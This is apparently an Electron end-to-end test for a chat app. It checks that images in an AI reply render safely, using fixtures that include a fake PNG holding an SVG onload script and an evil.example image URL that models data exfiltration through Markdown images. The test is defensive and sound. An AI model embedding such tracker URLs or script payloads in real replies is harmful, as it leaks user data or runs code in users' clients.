// Images an answer embeds with Markdown are shown inside the reply: a local image file loads by itself (through the main
// process, as data:), a web image whose address could carry data out waits behind a button, and right-click offers the
// image actions. Needs no model and no network: the reply is already in the transcript.
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { _electron as electron } from 'playwright-core'

const data = fs.mkdtempSync(path.join(os.tmpdir(), 'jolty-chat-image-'))
const png = path.join(data, 'map.png')
fs.writeFileSync(png, Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64'))
const fake = path.join(data, 'fake.png')
fs.writeFileSync(fake, '<svg onload="alert(1)"></svg>')
const slash = (p) => p.split(path.sep).join('/')
const leak = `https://evil.example/p.png?d=${'x'.repeat(200)}`
const reply = [
  'Here is the map:',
  '',
  `![Weapon map](${slash(png)})`,
  '',
  `![Not an image](${slash(fake)})`,
  '',
  `![Tracker](${leak})`
].join('\n')

fs.writeFileSync(path.join(data, 'profiles.json'), JSON.stringify([{ id: 'p1', name: 'Local', engine: 'claude', auth: 'endpoint', baseUrl: 'http://127.0.0.1:9', local: true, models: ['m'], color: '#d97757' }]))
fs.writeFileSync(path.join(data, 'sessions.json'), JSON.stringify([{ id: 's1', profileId: 'p1', engine: 'claude', cwd: data, title: 'Images', permissionMode: 'ask', createdAt: 1, updatedAt: 1 }]))
fs.writeFileSync(path.join(data, 'settings.json'), JSON.stringify({ language: 'en', lastCwd: data }))
fs.mkdirSync(path.join(data, 'transcripts'))
fs.writeFileSync(path.join(data, 'transcripts', 's1.json'), JSON.stringify([{ kind: 'user', id: 'u1', text: 'show me' }, { kind: 'assistant', id: 'a1', text: reply }]))

const env = { ...process.env, JOLTY_TEST: '1', JOLTY_DATA_DIR: data }
delete env.ELECTRON_RUN_AS_NODE
const pause = (ms) => new Promise((r) => setTimeout(r, ms))

const app = await electron.launch({ args: [path.resolve('out/main/index.js'), '--user-data-dir=' + path.join(data, 'electron')], env, timeout: 60000 })
try {
  const win = await app.firstWindow()
  win.setDefaultTimeout(30000)
  await win.waitForSelector('.brand-name', { timeout: 60000 })
  await win.keyboard.press('Escape')
  await win.locator('.session-item').first().click()

  const img = win.locator('.md .md-img img')
  await img.waitFor()
  assert.match(await img.getAttribute('src'), /^data:image\/png;base64,/, 'the local image is shown as data:')
  assert.equal(await img.getAttribute('alt'), 'Weapon map')
  assert.equal(await img.evaluate((el) => el.naturalWidth), 1, 'the image decodes')

  // a file that only claims to be an image falls back to a plain link
  await win.locator('.md a', { hasText: 'Not an image' }).waitFor()

  // the address that could carry data out is not fetched until clicked
  const ask = win.locator('.md .md-img.ask .md-img-load')
  await ask.waitFor()
  const label = await ask.evaluate((el) => getComputedStyle(el, '::before').content)
  assert.ok(label.includes('evil.example'), `the button names the host: ${label}`)
  assert.equal(await win.locator('.md .md-img img').count(), 1, 'only the local image is loaded')

  await img.click({ button: 'right' })
  await pause(300)
  const menu = await win.locator('.ctx-item').allInnerTexts()
  assert.ok(menu.some((t) => /copy image/i.test(t)), `right-click offers the image actions: ${menu.join(' | ')}`)
  await win.keyboard.press('Escape')

  await win.screenshot({ path: path.join(data, 'chat-image.png') })
  console.log('chat images ok', path.join(data, 'chat-image.png'))
} finally {
  const proc = app.process()
  await Promise.race([app.close().catch(() => undefined), pause(10000)])
  if (proc.exitCode === null) proc.kill()
}
